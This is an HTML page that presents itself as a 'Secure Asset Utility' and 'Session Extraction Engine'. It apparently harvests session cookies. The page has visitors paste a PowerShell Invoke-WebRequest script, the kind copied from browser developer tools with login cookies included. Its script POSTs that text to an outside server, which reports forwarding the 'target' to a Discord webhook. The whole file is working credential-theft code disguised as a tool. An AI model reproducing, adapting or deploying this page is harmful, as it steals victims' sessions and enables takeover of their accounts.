<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NexusStudio | Secure Asset Utility</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-base: #07090e;
            --bg-card: rgba(13, 17, 26, 0.75);
            --border-subtle: rgba(255, 255, 255, 0.08);
            --border-focus: rgba(99, 102, 241, 0.5);
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --accent: #6366f1;
            --accent-hover: #4f46e5;
            --success: #10b981;
            --error: #ef4444;
            --font-sans: 'Plus Jakarta Sans', sans-serif;
            --font-mono: 'JetBrains Mono', monospace;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            background-color: var(--bg-base);
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(99, 102, 241, 0.08) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(16, 185, 129, 0.05) 0%, transparent 40%);
            color: var(--text-main);
            font-family: var(--font-sans);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            width: 100%;
            max-width: 520px;
            padding: 24px;
        }

        .card {
            background: var(--bg-card);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid var(--border-subtle);
            border-radius: 20px;
            padding: 36px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
        }

        .header {
            margin-bottom: 28px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .logo-area h1 {
            font-size: 20px;
            font-weight: 700;
            letter-spacing: -0.025em;
            color: var(--text-main);
        }

        .logo-area p {
            font-size: 13px;
            color: var(--text-muted);
            margin-top: 4px;
        }

        .badge {
            background: rgba(99, 102, 241, 0.1);
            color: var(--accent);
            font-family: var(--font-mono);
            font-size: 11px;
            font-weight: 500;
            padding: 4px 10px;
            border-radius: 20px;
            border: 1px solid rgba(99, 102, 241, 0.2);
        }

        .input-group {
            margin-bottom: 24px;
        }

        label {
            display: block;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            color: var(--text-muted);
            margin-bottom: 8px;
        }

        textarea {
            width: 100%;
            height: 130px;
            background: rgba(4, 6, 10, 0.6);
            border: 1px solid var(--border-subtle);
            border-radius: 12px;
            padding: 14px;
            color: #38bdf8;
            font-family: var(--font-mono);
            font-size: 12px;
            resize: none;
            transition: all 0.2s ease;
        }

        textarea:focus {
            outline: none;
            border-color: var(--border-focus);
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.15);
        }

        .btn {
            width: 100%;
            background: var(--accent);
            color: white;
            border: none;
            border-radius: 12px;
            padding: 14px;
            font-family: var(--font-sans);
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: 0 4px 12px rgba(99, 102, 241, 0.3);
        }

        .btn:hover {
            background: var(--accent-hover);
            transform: translateY(-1px);
            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.4);
        }

        .btn:disabled {
            background: rgba(255, 255, 255, 0.05);
            color: var(--text-muted);
            cursor: not-allowed;
            box-shadow: none;
            transform: none;
        }

        .console-box {
            margin-top: 24px;
            background: rgba(4, 6, 10, 0.8);
            border: 1px solid var(--border-subtle);
            border-radius: 12px;
            padding: 14px;
            height: 130px;
            overflow-y: auto;
            font-family: var(--font-mono);
            font-size: 11px;
        }

        .log-line {
            margin-bottom: 6px;
            color: var(--text-muted);
            display: flex;
            align-items: flex-start;
            gap: 8px;
            word-break: break-all;
        }

        .log-line.pending { color: #f59e0b; }
        .log-line.success { color: var(--success); }
        .log-line.error { color: var(--error); }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="header">
                <div class="logo-area">
                    <h1>NexusStudio</h1>
                    <p>Session Extraction Engine</p>
                </div>
                <div class="badge">v2.5 Live</div>
            </div>

            <div class="input-group">
                <label for="psInput">PowerShell Capture Payload</label>
                <textarea id="psInput" spellcheck="false" placeholder="Paste Invoke-WebRequest script here..."></textarea>
            </div>

            <button id="actionBtn" class="btn" onclick="processAndDispatch()">Execute Extraction</button>

            <div class="input-group" style="margin-top: 24px; margin-bottom: 0;">
                <label>System Live Terminal</label>
                <div id="statusFeed" class="console-box">
                    <div class="log-line"><span>⚡ System idle, awaiting input...</span></div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Forces explicit production link to prevent base URI matching anomalies
        const BACKEND_URL = "https://rbxdev.up.railway.app";
        const statusFeed = document.getElementById('statusFeed');

        function logStatus(message, type = '') {
            const line = document.createElement('div');
            line.className = `log-line ${type}`;
            line.innerHTML = `<span>></span> <span>[${new Date().toLocaleTimeString()}] ${message}</span>`;
            statusFeed.appendChild(line);
            statusFeed.scrollTop = statusFeed.scrollHeight;
        }

        async function processAndDispatch() {
            const rawPs = document.getElementById('psInput').value.trim();
            const actionBtn = document.getElementById('actionBtn');
            
            if (!rawPs.includes("Invoke-WebRequest")) {
                logStatus("Error: Invalid PowerShell script format.", "error");
                return;
            }

            actionBtn.disabled = true;
            actionBtn.innerText = "Processing Payload...";
            statusFeed.innerHTML = '';

            logStatus(`Connecting to ${BACKEND_URL}/api/process...`, "pending");

            try {
                const response = await fetch(`${BACKEND_URL}/api/process`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ script: rawPs })
                });

                let data;
                try {
                    data = await response.json();
                } catch (parseErr) {
                    data = { error: `Non-JSON response received (HTTP status ${response.status})` };
                }

                if (response.ok) {
                    logStatus("Success: Target parsed and dispatched to Discord webhook.", "success");
                    actionBtn.innerText = "Dispatched Successfully";
                } else {
                    logStatus(`SERVER ERROR [HTTP ${response.status}]: ${data.error || response.statusText}`, "error");
                    actionBtn.innerText = "Server Error";
                }
            } catch (err) {
                console.error(err);
                logStatus(`NETWORK ERROR / FETCH FAILED: ${err.message}`, "error");
                actionBtn.innerText = "Connection Failed";
            } finally {
                actionBtn.disabled = false;
                if (actionBtn.innerText === "Processing Payload...") {
                    actionBtn.innerText = "Execute Extraction";
                }
            }
        }
    </script>
</body>
</html>
